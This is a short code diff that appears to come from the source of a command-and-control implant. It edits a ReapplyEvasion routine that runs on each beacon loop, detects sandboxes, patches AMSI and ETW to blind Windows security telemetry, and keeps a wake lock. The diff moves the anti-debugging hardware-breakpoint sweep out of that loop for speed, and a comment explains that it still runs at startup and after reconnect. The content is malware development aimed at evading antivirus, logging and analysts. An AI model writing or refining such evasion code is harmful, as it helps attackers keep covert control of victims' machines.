@@ -332,6 +332,13 @@ VOID ReleaseWakeLock() {
 }
 
 // ─── Reapply evasion (called each beacon loop) ─────────────────────────────
+// ClearHardwareBreakpoints() is deliberately NOT called here. It takes a
+// TH32CS_SNAPTHREAD snapshot of every thread in the OS and walks all of them
+// to reach the handful owned by this process (Toolhelp cannot filter threads
+// by pid), which made it the most expensive per-beacon operation by a wide
+// margin. Debug registers are not re-set on their own, so the sweep still runs
+// at startup (src/main.cpp) and again after a reconnect (src/c2.cpp), which
+// covers the cases where they could actually appear.
 VOID ReapplyEvasion() {
     if (IsLikelySandbox()) {
         DeepSleep();
@@ -339,7 +346,6 @@ VOID ReapplyEvasion() {
     }
     PatchAMSI();
     PatchETW();
-    ClearHardwareBreakpoints();
     AcquireWakeLock();
 }
 
